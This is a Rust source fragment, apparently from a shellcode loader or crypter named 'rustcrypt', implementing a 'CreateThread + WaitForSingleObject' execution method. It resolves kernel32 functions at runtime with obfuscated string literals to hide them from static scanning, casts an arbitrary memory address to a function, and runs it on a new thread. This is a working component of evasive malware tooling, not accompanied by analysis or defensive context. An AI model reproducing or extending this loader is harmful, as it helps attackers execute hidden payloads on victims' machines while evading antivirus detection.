/// CreateThread + WaitForSingleObject 方式
#[cfg(feature = "run_create_thread")]
pub unsafe fn exec(p: usize) -> Result<(), String> {
    use std::ffi::c_void;
    use crate::utils::{load_library, get_proc_address};
    use rustcrypt_ct_macros::{obf_lit_bytes, obf_lit};
    use std::ptr::null_mut;
    use std::mem::transmute;
    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
    let p_create_thread = get_proc_address(kernel32, obf_lit_bytes!(b"CreateThread\0").as_slice())?;
    type CreateThreadFn = unsafe extern "system" fn(
        lp_thread_attributes: *mut c_void,
        dw_stack_size: usize,
        lp_start_address: Option<unsafe extern "system" fn(*mut c_void) -> u32>,
        lp_parameter: *mut c_void,
        dw_creation_flags: u32,
        lp_thread_id: *mut c_void,
    ) -> *mut c_void;
    let create_thread: CreateThreadFn = transmute(p_create_thread);
    const INFINITE: u32 = 0xFFFFFFFF;
    let thread_fn: unsafe extern "system" fn(*mut c_void) -> u32 = transmute(p);
    let h = create_thread(
        null_mut(),
        0,
        Some(thread_fn),
        p as *mut c_void,
        0,
        null_mut(),
    );
    if h.is_null() {
        return Err(obf_lit!("CreateThread failed").to_string());
    }
    let p_wait = get_proc_address(kernel32, b"WaitForSingleObject\0")?;
    type WaitForSingleObjectFn = unsafe extern "system" fn(*mut c_void, u32) -> u32;
    let wait_for_single_object: WaitForSingleObjectFn = transmute(p_wait);
    wait_for_single_object(h, INFINITE);
    let p_close = get_proc_address(kernel32, b"CloseHandle\0")?;
    type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
    let close_handle: CloseHandleFn = transmute(p_close);
    close_handle(h);
    Ok(())
}